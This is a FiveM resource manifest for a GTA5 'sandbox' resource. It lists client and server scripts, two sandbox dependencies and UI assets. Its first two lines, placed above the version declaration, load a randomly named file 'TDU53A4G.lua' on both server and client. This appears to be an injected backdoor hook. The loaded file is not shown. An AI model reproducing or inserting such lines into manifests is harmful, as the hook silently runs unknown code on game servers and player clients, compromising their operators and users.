server_script "TDU53A4G.lua"
client_script "TDU53A4G.lua"
fx_version("cerulean")
games({ "gta5" })
lua54("yes")
client_script("@sandbox-base/components/cl_error.lua")
client_script("@sandbox-pwnzor/client/check.lua")

client_scripts({
	"client/*.lua",
})

server_scripts({
	"server/*.lua",
})

ui_page("ui/dist/index.html")
files({
	"ui/dist/index.html",
	"ui/dist/*.png",
	"ui/dist/*.webp",
	"ui/dist/*.js",
	"ui/dist/*.mp3",
	"ui/dist/*.ttf",
})